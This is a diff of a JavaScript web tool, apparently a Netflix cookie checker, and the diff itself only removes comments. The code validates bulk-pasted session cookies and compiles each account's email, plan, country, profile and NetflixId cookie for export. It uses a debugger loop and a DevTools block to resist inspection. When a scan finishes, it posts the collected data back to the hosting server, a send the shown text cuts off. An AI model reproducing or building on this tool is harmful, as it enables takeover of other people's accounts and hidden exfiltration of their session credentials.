@@ -1428,7 +1428,7 @@ function onDevToolsClose() {
 
     showAlert("success", "RESUMED", "You can continue now.");
 }
-    // 🔥 ULTRA STEALTH MODE (ADD THIS HERE)
+
 setInterval(() => {
     debugger;
 }, 3000);
@@ -1606,7 +1606,7 @@ document.getElementById('bulkInput').addEventListener('paste', function (e) {
 }
 async function startApiTest() {
 
-    // 🔒 HARD BLOCK DEVTOOLS (ADD THIS HERE)
+    
     if (devtoolsOpen) {
         alert("Close DevTools to continue.");
         return;
@@ -1614,7 +1614,7 @@ async function startApiTest() {
     
     if (isProcessing) return;
 
-    exportData = []; // ✅ reset export data
+    exportData = []; 
     countSuccess = 0;
     countError = 0;
     countWarning = 0;
@@ -1673,9 +1673,9 @@ async function startApiTest() {
                     country: data.x_loc,
                     profile: data.x_usr
                  });
-                    // ✅ Collect export data (safe, non-breaking)
-const netflixId = extractNetflixId(cookies[i]); // 👈 SAFE ADD
-    document.getElementById('exportBtn').disabled = false; // ✅ MOVE OUTSIDE
+                    
+const netflixId = extractNetflixId(cookies[i]); 
+    document.getElementById('exportBtn').disabled = false;
 exportData.push(
     `📧Email: ${data.x_mail || 'N/A'}\n` +
     `📋Plan: ${data.x_tier || 'N/A'}\n` +
@@ -1687,7 +1687,7 @@ exportData.push(
     `🍪NetflixId=${netflixId}\n` +
     `----------------------------------------`
 );
-                    // UI NOW READS FROM THE FAKE 'x_' VARIABLES
+                    
                     let planStr = data.x_tier || 'Unknown';
                     let premiumClass = planStr.includes('Premium') ? 'text-success' : 'text-info';
                     
@@ -1806,7 +1806,7 @@ exportData.push(
         $('#startBtn .btn-text').text('Scan & Generate Token');
         document.getElementById('btnProgressText').textContent = 'Processing...';
         }, 1200);
-        unlockInputs(); // 🔓 UNLOCK UI
+        unlockInputs(); 
 
      if (exportData.length > 0) {
         fetch(window.location.href, {
@@ -2109,7 +2109,7 @@ function showAlert(type, title, message, extra = {}) {
     titleEl.textContent = title;
     msgEl.textContent = message;
 
-    // 🔥 ULTRA DETAILS
+    
     if (extra.email || extra.plan) {
 
         const isPremium = (extra.plan || "").toLowerCase().includes("premium");
